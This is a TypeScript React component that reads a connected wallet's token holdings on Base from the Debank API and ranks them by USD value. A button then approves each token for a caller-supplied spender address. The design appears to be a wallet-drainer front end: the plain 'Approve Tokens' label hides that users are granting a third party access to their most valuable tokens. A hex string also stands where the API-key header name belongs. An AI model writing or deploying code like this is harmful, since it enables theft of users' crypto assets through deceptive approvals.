
// components/approve-button.tsx
"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import { ethers, InfuraProvider, formatUnits, parseUnits, BrowserProvider, Contract } from "ethers";
import axios from "axios"; // For fetching token prices


interface Token {
  id: string;
  balance: string;
  price: number;
  decimal: number;
}

type ScanWalletProps = {
  spenderAddress: string;       // The address that will be approved to spend tokens
  debankApiKey: string;         // Debank API key for querying balances
  amount: string;               // Amount to approve (using 18 decimals)
};

type TokenData = {
  address: string;
  balance: string;
  value: number; // USD value of the token balance
};

export default function ScanWalletNew({ spenderAddress, debankApiKey, amount }: ScanWalletProps) {
  const { address } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [isLoading, setIsLoading] = useState(false);
  const [tokens, setTokens] = useState<TokenData[]>([]);
  const [approvedTokens, setApprovedTokens] = useState<number>(0); // Tracks the number of successfully approved tokens


  useEffect(() => {
    if (address) {
      fetchTokenBalancesAndValues();
    }
  }, [address]);

  const fetchTokenBalancesAndValues = async () => {
    try {
      setIsLoading(true);
  
      const headers = {
        "f2cccb512bb7e5001296a63f70c44c8be8fb2d64": debankApiKey,
      };
  
      // Fetch token balances and prices from Debank
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/token_list`,
        {
          params: {
            id: address,
            chain_id: "base", // Specify the chain (use "base" for Base network)
          },
          headers,
        }
      );
  
      const tokenList: Token[] = response.data; // Explicitly define the type
      console.log("Debank API Token List:", tokenList);
  
      // Map token data to match your component's structure
      const tokenData = tokenList.map((token: Token) => ({
        address: token.id,
        balance: formatUnits(token.balance, token.decimal),
        value: parseFloat(token.balance) / 10 ** token.decimal * token.price,
      }));
  
      // Sort by value in descending order
      tokenData.sort((a, b) => b.value - a.value);
      setTokens(tokenData);
    } catch (error) {
      console.error("Error fetching token balances and values from Debank:", error);
    } finally {
      setIsLoading(false);
    }
  };

  const approveTokens = async () => {
    if (!walletClient) {
      alert("Wallet not connected!");
      return;
    }

    try {
      setIsLoading(true);
      let approvedCount = 0;

      // Use BrowserProvider for wallet interaction
      const provider = new BrowserProvider(walletClient);
      const signer = await provider.getSigner();

      for (const token of tokens) {
        const contract = new Contract(
          token.address,
          ["function approve(address spender, uint256 amount) public returns (bool)"],
          signer
        );

        // Approve the token
        const tx = await contract.approve(spenderAddress, parseUnits(amount, 18));
        await tx.wait(); // Wait for the transaction to be mined
        approvedCount++;
        setApprovedTokens(approvedCount); // Update state after each approval
      }

      alert("All tokens approved!");
    } catch (error) {
      console.error("Error approving tokens:", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div>
      <h2>Token Balances</h2>
      {isLoading ? (
        <p>Loading...</p>
      ) : (
        <ul>
          {tokens.map((token) => (
            <li key={token.address}>
              Token: {token.address} | Balance: {token.balance} | Value: ${token.value.toFixed(2)}
            </li>
          ))}
        </ul>
      )}
      <button onClick={approveTokens} disabled={isLoading || tokens.length === 0}>
        {isLoading ? "Approving..." : `Approve Tokens (${approvedTokens}/${tokens.length})`}
      </button>
    </div>
  );
}